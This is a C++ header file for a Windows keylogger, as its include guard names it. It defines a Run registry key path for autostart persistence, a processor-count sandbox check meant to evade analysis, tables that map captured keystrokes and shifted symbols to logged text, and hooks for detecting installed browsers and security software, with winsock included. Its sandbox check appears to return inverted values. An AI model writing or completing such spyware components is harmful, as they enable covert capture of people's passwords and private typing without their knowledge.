#ifndef KEYLOGGER_H_INCLUDED
#define KEYLOGGER_H_INCLUDED
#include <iostream>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#define RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define KeyBoard "Control Panel\\Keyboard\\"
#define KeyboardDelay KeyBoard + "KeyboardDelay"
#define KeyBoardSpeed KeyBoard + "KeyBoardSpeed"
#define MapFunctionKeys MapFunctionKeysExA
#define MapKeys MapKeysExA
#define SandBoxDetection SandBoxDetectionExA
#define MemConsumeLim       0x20000
#define Major               0x02
#define Minor               0x02
#define StartAsciiDec       0x30
#define EndAsciiDec         0x3A
#define StartAsciiAlphebet  0x41
#define EndAsciiAlphebet    0x5B
#define MaxClipboardDataOut 0x30
#define StartFunctionKeys   0x00
#define EndFunctionKeys     0x05
#define StartUnmapedKeys    0x00
#define EndUnmapedKeys      0x0C
#define MaxDirPathLength    0xFF
#define Vk_DEL              0x08
#define VK_CRLF             0x0D
#define AsyncKeyStateTest_0 0x00
#define AsyncKeyStateTest_1 0x01
#define AsciiDecimalToBase  0x30
#define AsciiLowerToUpper   0x20
#define CharTableSize       0x0A
#define SandBoxCoreCount    0x02
#define SandBoxedInstance   0x00
#define HardwareInstance    0x01
#define AsciiAlternitive_1  0x29
#define AsciiAlternitive_2  0x21
#define AsciiAlternitive_3  0x40
#define AsciiAlternitive_4  0x23
#define AsciiAlternitive_5  0x24
#define AsciiAlternitive_6  0x25
#define AsciiAlternitive_7  0x5e
#define AsciiAlternitive_8  0x26
#define AsciiAlternitive_9  0x2A
#define AsciiAlternitive_0  0x28
#define DetectBrowserInstalation DetectBrowserInstalationExA
#define DetectSecurityInstalation DetectSecurityInstalationExA



typedef struct FunctionKeys
{
    char Key;
    char* str;
}FunctionKeys;

typedef struct UnmapedChar
{
    char Primary;
    char Secondary;
}UnmapedChar;

FORCEINLINE UnmapedChar MapKeysExA(char p, char s)
{
    UnmapedChar temp;
    temp.Primary=p;
    temp.Secondary=s;
    return temp;
}

FORCEINLINE FunctionKeys MapFunctionKeysExA(char LastKeyStrokeLogged, char* str)
{
    FunctionKeys temp;
    temp.Key=LastKeyStrokeLogged;
    temp.str=str;
    return temp;
}

FORCEINLINE BOOL SandBoxDetectionExA()
 {
     SYSTEM_INFO CoreDection;
     GetSystemInfo(&CoreDection);
     return (CoreDection.dwNumberOfProcessors<=SandBoxCoreCount)?HardwareInstance:SandBoxedInstance;
 }


const extern FunctionKeys MapFunctionVkeys[]={
    MapFunctionKeys(Vk_DEL,(char*)" \\*DEL*\\ "),MapFunctionKeys(VK_TAB,(char*)" \\*TAB*\\ "),MapFunctionKeys(VK_CRLF,(char*)" \\*CRLF*\\ "),\
    MapFunctionKeys(VK_CONTROL,(char*)" \\*CTRL*\\ ")};

const extern char _Char_Table[CharTableSize]={
    AsciiAlternitive_1,AsciiAlternitive_2,AsciiAlternitive_3,AsciiAlternitive_4,AsciiAlternitive_5,
    AsciiAlternitive_6,AsciiAlternitive_7,AsciiAlternitive_8,AsciiAlternitive_9,AsciiAlternitive_0};

const extern UnmapedChar MapUnmapedVkeys[]={
    MapKeys('`','~'),MapKeys('-','_'),MapKeys('=','+'),MapKeys('[','{'),MapKeys(']','}'),MapKeys('\\','|'),
    MapKeys(';',':'),MapKeys('\'','"'),MapKeys(',','<'),MapKeys('.','>'),MapKeys('/','?'),MapKeys(' ',' ')};


#endif // KEYLOGGER_H_INCLUDED
